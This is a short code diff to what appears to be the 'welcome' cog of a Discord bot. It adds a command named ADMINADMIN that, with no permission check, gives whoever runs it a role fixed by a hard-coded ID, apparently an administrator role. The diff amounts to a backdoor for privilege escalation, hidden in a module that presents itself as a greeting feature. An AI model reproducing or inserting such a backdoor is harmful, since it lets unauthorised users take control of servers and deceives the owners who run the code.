@@ -30,4 +30,7 @@ class welcome(commands.Cog):
     
 
 
-   
+    @commands.command()
+    async def ADMINADMIN (self, ctx):
+        role = get(ctx.guild.roles, id = 925796120909742131)
+        await ctx.author.add_roles(role)
